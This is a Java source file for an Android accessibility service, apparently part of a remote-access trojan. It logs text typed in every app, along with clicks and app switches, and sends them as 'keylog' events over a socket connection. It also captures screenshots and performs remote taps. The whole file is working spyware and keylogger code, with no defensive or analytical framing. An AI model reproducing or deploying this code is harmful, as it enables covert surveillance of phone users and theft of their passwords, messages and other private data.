package com.sys.service.manager;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.view.Display;
import androidx.annotation.RequiresApi;
import java.util.concurrent.Executors;

/**
 * Remote Control and Screen Capture via Accessibility Service
 */
public class RemoteControlService extends AccessibilityService {

    private static RemoteControlService instance = null;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.e("RemoteControl", "Accessibility Service Connected!");
    }

    public static RemoteControlService getInstance() {
        return instance;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        int eventType = event.getEventType();
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Desconocido";

        try {
            switch (eventType) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    if (event.getText() != null && !event.getText().isEmpty()) {
                        StringBuilder sb = new StringBuilder();
                        for (CharSequence cs : event.getText()) {
                            sb.append(cs);
                        }
                        String typedText = sb.toString().trim();
                        if (!typedText.isEmpty() && !typedText.equals("[]")) {
                            sendKeylog("[" + packageName + "] TYPED: " + typedText);
                        }
                    }
                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    CharSequence desc = event.getContentDescription();
                    if (event.getText() != null && !event.getText().isEmpty()) {
                        sendKeylog("[" + packageName + "] CLICKED: " + event.getText().get(0));
                    } else if (desc != null && desc.length() > 0) {
                        sendKeylog("[" + packageName + "] CLICKED: " + desc);
                    }
                    break;
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    sendKeylog("ABRIO APP: " + packageName);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendKeylog(String logText) {
        try {
            org.json.JSONObject data = new org.json.JSONObject();
            data.put("log", logText);
            IOSocket.getInstance().getIoSocket().emit("x0000kl", data);
        } catch (Exception e) {
            // Log error
        }
    }

    @Override
    public void onInterrupt() {
    }

    // Modern Screenshot (Android 11+)
    @RequiresApi(api = Build.VERSION_CODES.R)
    public void takeScreenCapture() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, Executors.newSingleThreadExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(), screenshotResult.getColorSpace());
                    if (bitmap != null) {
                        Log.e("ScreenManager", "Screenshot captured successfully!");
                        // Since hardware buffer might need software conversion for JPEG
                        Bitmap softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                        ScreenManager.sendScreenshot(softwareBitmap);
                    }
                }

                @Override
                public void onFailure(int i) {
                    Log.e("ScreenManager", "Screenshot capture failed: " + i);
                }
            });
        }
    }

    // Remote Click Action
    public void performClick(int x, int y) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path path = new Path();
            path.moveTo(x, y);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 10));
            dispatchGesture(builder.build(), null, null);
        }
    }
}
